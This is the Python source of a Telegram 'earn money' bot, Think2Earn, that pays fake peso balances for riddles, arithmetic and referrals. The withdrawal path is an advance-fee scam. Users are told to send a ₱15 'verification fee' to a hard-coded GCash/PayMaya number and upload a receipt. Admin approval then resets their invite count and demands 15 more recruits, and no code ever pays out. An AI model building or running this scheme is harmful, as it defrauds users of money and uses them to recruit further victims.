import os
import sqlite3
import time
import random
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes,
)

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
BOT_USERNAME = "think2EarnBot" # Change this to your actual bot username without the '@'
ADMIN_ID = 775857744 
REFERRAL_REWARD = 48.88 
MIN_WITHDRAW = 1000
WITHDRAW_FEE = 15.00
INVITE_LOCK_COUNT = 15  

ADMIN_GCASH = "09939775174"
ADMIN_PAYMAYA = "09939775174"

REWARDS = {"easy": 20, "medium": 40, "hard": 88, "logic": 88}

# ================== RENDER PORT FIX ==================
# This satisfies Render's "No open ports detected" error
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is Running")

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    server.serve_forever()

# ================== DATABASE ==================
db = sqlite3.connect("think2earn.db", check_same_thread=False)
cur = db.cursor()

cur.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    referrals_after_fee INTEGER DEFAULT 0,
    status TEXT DEFAULT 'active'
)
""")
cur.execute("CREATE TABLE IF NOT EXISTS referrals (referrer INTEGER, referred INTEGER UNIQUE)")
db.commit()

pending = {} 

# ================== EXPANDED LOGIC QUESTIONS ==================
LOGIC_QUESTIONS = [
    ("What has keys but no locks?", "keyboard"),
    ("What gets wetter as it dries?", "towel"),
    ("What belongs to you, but others use it more?", "name"),
    ("What has a neck but no head?", "bottle"),
    ("What has an eye but cannot see?", "needle"),
    ("What can you catch, but not throw?", "cold"),
    ("What has hands but cannot clap?", "clock"),
    ("What goes up but never comes down?", "age"),
    ("What has words but never speaks?", "book"),
    ("What runs but has no legs?", "river"),
    ("What has a thumb and four fingers but is not alive?", "glove"),
    ("The more of this there is, the less you see. What is it?", "darkness"),
    ("What building has the most stories?", "library"),
    ("What starts with T, ends with T, and has T in it?", "teapot"),
    ("What is full of holes but still holds water?", "sponge"),
    ("What has many teeth but cannot bite?", "comb"),
    ("What kind of room has no doors or windows?", "mushroom"),
    ("What can travel around the world while staying in a corner?", "stamp"),
    ("I follow you all day long, but when the sun goes down, I am gone. What am I?", "shadow"),
    ("What is black when it’s clean and white when it’s dirty?", "blackboard")
]

# ================== UI COMPONENTS ==================
def main_menu_keyboard():
    keyboard = [
        [KeyboardButton("🧮 Math"), KeyboardButton("🧠 Logic")],
        [KeyboardButton("💰 Balance"), KeyboardButton("👥 Referrals")],
        [KeyboardButton("📜 Rules"), KeyboardButton("🏆 Leaderboard")],
        [KeyboardButton("💸 Withdraw")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def admin_approval_keyboard(user_id, amount):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Approve Fee", callback_data=f"app_{user_id}_{amount}")],
        [InlineKeyboardButton("❌ Reject Fee", callback_data=f"rej_{user_id}")]
    ])

# ================== COMMANDS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name
    
    args = context.args
    if args and args[0].isdigit() and int(args[0]) != uid:
        referrer_id = int(args[0])
        try:
            cur.execute("INSERT INTO referrals (referrer, referred) VALUES (?, ?)", (referrer_id, uid))
            cur.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (REFERRAL_REWARD, referrer_id))
            cur.execute("UPDATE users SET referrals_after_fee = referrals_after_fee + 1 WHERE user_id = ?", (referrer_id,))
            db.commit()
        except sqlite3.IntegrityError:
            pass 

    cur.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (uid, uname))
    db.commit()
    
    welcome = (
        f"👋 <b>Welcome to Think2Earn, {uname}!</b>\n\n"
        "Earn real money by solving puzzles and inviting friends.\n"
        "• <b>Math:</b> Quick calculations.\n"
        "• <b>Logic:</b> Brain-teasing riddles.\n"
        "• <b>Referrals:</b> ₱48.88 for every friend!\n\n"
        "<i>Click a button below to begin.</i>"
    )
    await update.message.reply_text(welcome, reply_markup=main_menu_keyboard(), parse_mode="HTML")

# ================== MESSAGE HANDLER ==================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text

    # 1. Answer Check (Logic & Math)
    if uid in pending and "answer" in pending[uid]:
        data = pending.pop(uid)
        if text.strip().lower() == str(data["answer"]).lower():
            reward = REWARDS[data["level"]]
            cur.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (reward, uid))
            db.commit()
            await update.message.reply_text(f"✨ <b>Correct!</b>\nYou earned ₱{reward}.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ <b>Incorrect.</b>\nThe answer was: <i>{data['answer']}</i>", parse_mode="HTML")
        return

    # 2. Withdrawal Sequence
    if uid in pending and "step" in pending[uid]:
        if pending[uid]["step"] == "GET_NUMBER":
            pending[uid]["wallet_number"] = text
            pending[uid]["step"] = "GET_AMOUNT"
            await update.message.reply_text("💰 Enter withdrawal amount (Min: ₱1000):")
            return
        
        if pending[uid]["step"] == "GET_AMOUNT":
            try:
                amt = float(text)
                cur.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
                bal = cur.fetchone()[0]
                if amt < MIN_WITHDRAW or bal < amt:
                    await update.message.reply_text("❌ Insufficient balance or amount too low.")
                    return
                pending[uid].update({"amt": amt, "step": "AWAIT_PROOF"})
                method = pending[uid]["wd_method"]
                admin_num = ADMIN_GCASH if method == "GCash" else ADMIN_PAYMAYA
                msg = (
                    f"🛡 <b>Verification Required</b>\n\n"
                    f"To process your ₱{amt} withdrawal, pay the verification fee:\n"
                    f"• Amount: <b>₱{WITHDRAW_FEE}</b>\n"
                    f"• {method}: <code>{admin_num}</code>\n\n"
                    "📸 <b>Send the receipt screenshot below:</b>"
                )
                await update.message.reply_text(msg, parse_mode="HTML")
            except: 
                await update.message.reply_text("❌ Invalid number.")
            return

    # 3. Menu Options
    if text == "🧠 Logic":
        q, a = random.choice(LOGIC_QUESTIONS)
        pending[uid] = {"answer": a.lower(), "level": "logic"}
        await update.message.reply_text(f"<b>Riddle:</b>\n{q}", parse_mode="HTML")

    elif text == "🧮 Math":
        await update.message.reply_text("Select Level:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Easy ₱20", callback_data="math_easy"), InlineKeyboardButton("Hard ₱88", callback_data="math_hard")]
        ]))

    elif text == "💰 Balance":
        cur.execute("SELECT balance FROM users WHERE user_id=?", (uid,))
        res = cur.fetchone()
        bal = res[0] if res else 0
        await update.message.reply_text(f"💳 <b>Wallet Balance:</b> ₱{bal:.2f}", parse_mode="HTML")

    elif text == "👥 Referrals":
        link = f"https://t.me/{BOT_USERNAME}?start={uid}"
        cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer=?", (uid,))
        total_refs = cur.fetchone()[0]
        await update.message.reply_text(
            f"👥 <b>Your Referral Link:</b>\n<code>{link}</code>\n\n"
            f"🎁 Earn ₱{REFERRAL_REWARD} for every friend you invite!\n"
            f"📈 Total Referrals: {total_refs}", 
            parse_mode="HTML"
        )

    elif text == "📜 Rules":
        rules = (
            "📜 <b>Rules & Info:</b>\n"
            "1. Answer Math & Logic puzzles correctly to earn.\n"
            "2. Referrals give ₱48.88 each.\n"
            "3. Minimum withdrawal is ₱1000.\n"
            "4. A ₱15 verification fee is required for the first withdrawal.\n"
            "5. After fee, 15 more invites are needed to unlock payout."
        )
        await update.message.reply_text(rules, parse_mode="HTML")

    elif text == "💸 Withdraw":
        await update.message.reply_text("Choose Withdrawal Method:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("GCash", callback_data="wd_gcash"), InlineKeyboardButton("PayMaya", callback_data="wd_paymaya")]
        ]))
    
    elif text == "🏆 Leaderboard":
        cur.execute("SELECT username, balance FROM users ORDER BY balance DESC LIMIT 10")
        rows = cur.fetchall()
        lb = "🏆 <b>TOP 10 EARNERS</b>\n\n"
        for i, r in enumerate(rows, 1): 
            lb += f"{i}. {r[0] or 'User'} — ₱{r[1]:.2f}\n"
        await update.message.reply_text(lb, parse_mode="HTML")

# ================== CALLBACK HANDLER ==================
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    data = query.data
    await query.answer()

    if data.startswith("math_"):
        level = data.split("_")[1]
        if level == "easy":
            a, b = random.randint(1, 20), random.randint(1, 20)
            ans = a + b
            pending[uid] = {"answer": ans, "level": "easy"}
            await query.message.reply_text(f"🔢 <b>Math (Easy):</b>\nWhat is {a} + {b}?", parse_mode="HTML")
        else:
            a, b, c = random.randint(10, 50), random.randint(10, 50), random.randint(5, 15)
            ans = (a + b) - c
            pending[uid] = {"answer": ans, "level": "hard"}
            await query.message.reply_text(f"🔢 <b>Math (Hard):</b>\nWhat is ({a} + {b}) - {c}?", parse_mode="HTML")

    elif data.startswith("wd_"):
        pending[uid] = {"wd_method": "GCash" if "gcash" in data else "PayMaya", "step": "GET_NUMBER"}
        await query.message.reply_text(f"📱 Enter your {pending[uid]['wd_method']} account number:")

    elif data.startswith("app_"): 
        _, target_id, amount = data.split("_")
        cur.execute("UPDATE users SET referrals_after_fee = 0 WHERE user_id = ?", (target_id,))
        db.commit()
        await context.bot.send_message(
            chat_id=target_id,
            text=(
                "✅ <b>Fee Verified!</b>\n\n"
                "Your withdrawal is now <b>PENDING</b>. To unlock the final transfer, "
                "you must <b>invite 15 more active users</b> using your referral link.\n\n"
                f"Current Progress: 0/{INVITE_LOCK_COUNT}"
            ),
            parse_mode="HTML"
        )
        await query.edit_message_caption(caption=f"✅ Approved for UID {target_id}")

# ================== PHOTO HANDLER ==================
async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in pending and pending[uid].get("step") == "AWAIT_PROOF":
        data = pending.pop(uid)
        photo_id = update.message.photo[-1].file_id
        admin_txt = f"💰 <b>NEW FEE PROOF</b>\nUID: {uid}\nAmount: ₱{data['amt']}\nNo: {data['wallet_number']}"
        await context.bot.send_photo(
            chat_id=ADMIN_ID, 
            photo=photo_id, 
            caption=admin_txt, 
            parse_mode="HTML",
            reply_markup=admin_approval_keyboard(uid, data['amt'])
        )
        await update.message.reply_text("🕒 <b>Proof Sent!</b> Admin will verify your fee shortly.")

if __name__ == "__main__":
    # Start the health check server in a background thread
    threading.Thread(target=run_health_server, daemon=True).start()
    
    # Start the Telegram Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, photo_handler))
    
    print("Bot is starting...")
    app.run_polling()
